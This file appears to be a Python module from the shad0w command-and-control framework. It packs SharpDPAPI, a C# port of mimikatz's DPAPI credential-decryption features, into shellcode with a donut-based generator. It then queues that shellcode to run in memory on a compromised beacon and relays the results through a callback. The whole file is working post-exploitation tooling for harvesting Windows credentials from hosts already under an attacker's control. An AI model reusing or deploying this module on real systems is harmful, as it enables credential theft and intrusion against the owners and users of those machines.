#
# Execute sharpdpapi on a session
#

import argparse

from lib import shellcode

__description__ = "A C# port of some DPAPI functionality from mimikatz"
__author__ = "@_batsec_, @harmj0y"

# identify the task as shellcode execute
USERCD_EXEC_ID = 0x3000

# location of sharpdpapi binary
SHARPDPAPI_BIN = "/root/shad0w/bin/SharpCollection/NetFramework_4.5_x86/SharpDPAPI.exe"

# beacon to exec command on
current_beacon = None

# little hack but lets us pass the args to donut
class DummyClass(object):
    def __init__(self):
        pass

def sharpdpapi_callback(shad0w, data):
    shad0w.event.beacon_info(current_beacon, data)

    return ""

def usage():
    pass

def main(shad0w, args, beacon):
    global current_beacon

    # make beacon global
    current_beacon = beacon

    sharpdpapi_args = ' '.join(args[1:])

    # kinda a hack to make sure we intergrate nice with the shellcode generator
    args = DummyClass()

    if len(sharpdpapi_args) != 0:
        args.param = sharpdpapi_args
    else:
        args.param = False
        sharpdpapi_args = False

    args.cls = False
    args.method = False
    args.runtime = False
    args.appdomain = False

    b64_comp_data = shellcode.generate(SHARPDPAPI_BIN, args, sharpdpapi_args)

    # dont clear the callbacks, cause the responses are chunked
    shad0w.clear_callbacks = False

    shad0w.beacons[current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
    shad0w.beacons[current_beacon]["callback"] = sharpdpapi_callback
